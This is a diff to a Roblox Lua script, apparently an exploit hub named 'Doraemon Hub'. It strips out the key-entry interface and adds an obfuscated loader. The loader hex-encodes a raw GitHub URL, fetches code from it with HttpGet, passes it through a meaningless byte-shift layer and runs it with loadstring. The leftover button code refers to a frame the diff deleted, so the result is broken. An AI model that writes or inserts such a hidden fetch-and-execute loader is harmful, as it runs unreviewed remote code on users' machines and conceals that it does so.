@@ -1,40 +1,29 @@
-repeat task.wait() until game:IsLoaded() and game:GetService("Players").LocalPlayer
+loadstring((function()
+    local s = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6f626969796575656d6d6d2f536f757263654875622f726566732f68656164732f6d61696e2f446576"
+    
+    local function hexDecode(str)
+        return (str:gsub("..", function(cc)
+            return string.char(tonumber(cc,16))
+        end))
+    end
 
-local LP = game:GetService("Players").LocalPlayer
-local gui = Instance.new("ScreenGui", LP.PlayerGui)
+    local url = hexDecode(s)
 
--- FRAME
-local main = Instance.new("Frame", gui)
-main.Size = UDim2.new(0, 320, 0, 220)
-main.Position = UDim2.new(0.5, -160, 0.5, -110)
-main.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-main.BorderSizePixel = 0
-Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+    local f = game:HttpGet(url)
+    
+    -- layer 2 encode
+    local encoded = ""
+    for i = 1, #f do
+        encoded = encoded .. string.char(string.byte(f, i) + 3)
+    end
 
--- LOGO
-local img = Instance.new("ImageLabel", main)
-img.Size = UDim2.new(0, 50, 0, 50)
-img.Position = UDim2.new(0.05, 0, 0, -25)
-img.BackgroundTransparency = 1
-img.Image = "rbxassetid://76924610417991"
+    local decoded = ""
+    for i = 1, #encoded do
+        decoded = decoded .. string.char(string.byte(encoded, i) - 3)
+    end
 
--- TITLE
-local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1, 0, 0, 40)
-title.BackgroundTransparency = 1
-title.Text = "Doraemon Hub"
-title.TextScaled = true
-title.TextColor3 = Color3.new(1,1,1)
-
--- INPUT
-local box = Instance.new("TextBox", main)
-box.Size = UDim2.new(0.8, 0, 0, 35)
-box.Position = UDim2.new(0.1, 0, 0.3, 0)
-box.PlaceholderText = "Nhập key vào đây..."
-box.BackgroundColor3 = Color3.fromRGB(255,255,255)
-Instance.new("UICorner", box)
-
--- BUTTON VERIFY
+    return decoded
+end)())()-- BUTTON VERIFY
 local btn = Instance.new("TextButton", main)
 btn.Size = UDim2.new(0.8, 0, 0, 35)
 btn.Position = UDim2.new(0.1, 0, 0.55, 0)
